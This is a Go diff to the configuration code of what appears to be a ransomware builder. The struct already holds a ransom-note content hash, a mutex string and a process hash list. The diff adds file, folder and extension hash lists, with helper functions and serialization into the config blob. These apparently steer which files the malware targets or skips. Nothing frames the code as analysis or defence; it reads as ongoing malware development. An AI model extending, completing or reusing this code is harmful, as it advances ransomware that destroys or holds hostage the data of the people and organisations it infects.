@@ -57,6 +57,9 @@ type Configuration struct {
 	ransomNoteContentHash   uint64
 	configurationHash       uint64
 	mutexString             []byte
+	fileHashList            []uint64
+	folderHashList          []uint64
+	extensionHashList       []uint64
 }
 
 func createConfiguration() (*Configuration, error) {
@@ -91,6 +94,57 @@ func (config *Configuration) removeProcessHashList(hash uint64) {
 	for index, eachHash := range config.processHashList {
 		if eachHash == hash {
 			config.processHashList = append(config.processHashList[:index], config.processHashList[index+1:]...)
+			return
+		}
+	}
+}
+
+func (config *Configuration) setFileHashList(fileHashList []uint64) {
+	config.fileHashList = fileHashList
+}
+
+func (config *Configuration) appendFileHashList(hash uint64) {
+	config.fileHashList = append(config.fileHashList, hash)
+}
+
+func (config *Configuration) removeFileHashList(hash uint64) {
+	for index, eachHash := range config.fileHashList {
+		if eachHash == hash {
+			config.fileHashList = append(config.fileHashList[:index], config.fileHashList[index+1:]...)
+			return
+		}
+	}
+}
+
+func (config *Configuration) setFolderHashList(folderHashList []uint64) {
+	config.folderHashList = folderHashList
+}
+
+func (config *Configuration) appendFolderHashList(hash uint64) {
+	config.folderHashList = append(config.folderHashList, hash)
+}
+
+func (config *Configuration) removeFolderHashList(hash uint64) {
+	for index, eachHash := range config.folderHashList {
+		if eachHash == hash {
+			config.folderHashList = append(config.folderHashList[:index], config.folderHashList[index+1:]...)
+			return
+		}
+	}
+}
+
+func (config *Configuration) setExtensionHashList(extensionHashList []uint64) {
+	config.extensionHashList = extensionHashList
+}
+
+func (config *Configuration) appendExtensionHashList(hash uint64) {
+	config.extensionHashList = append(config.extensionHashList, hash)
+}
+
+func (config *Configuration) removeExtensionHashList(hash uint64) {
+	for index, eachHash := range config.extensionHashList {
+		if eachHash == hash {
+			config.extensionHashList = append(config.extensionHashList[:index], config.extensionHashList[index+1:]...)
 			return
 		}
 	}
@@ -211,5 +265,31 @@ func (config *Configuration) toBytes() []byte {
 
 	// add mutexstring
 	result = append(result, config.mutexString...)
+	result = append(result, separator...)
+
+	// add fileHashList
+
+	for _, eachHash := range config.fileHashList {
+		binary.LittleEndian.PutUint64(hashBuffer, eachHash)
+
+		result = append(result, hashBuffer...)
+	}
+	result = append(result, separator...)
+
+	// add folderHashList
+
+	for _, eachHash := range config.folderHashList {
+		binary.LittleEndian.PutUint64(hashBuffer, eachHash)
+
+		result = append(result, hashBuffer...)
+	}
+	result = append(result, separator...)
+
+	// add extensionHashList
+	for _, eachHash := range config.extensionHashList {
+		binary.LittleEndian.PutUint64(hashBuffer, eachHash)
+
+		result = append(result, hashBuffer...)
+	}
 	return result
 }
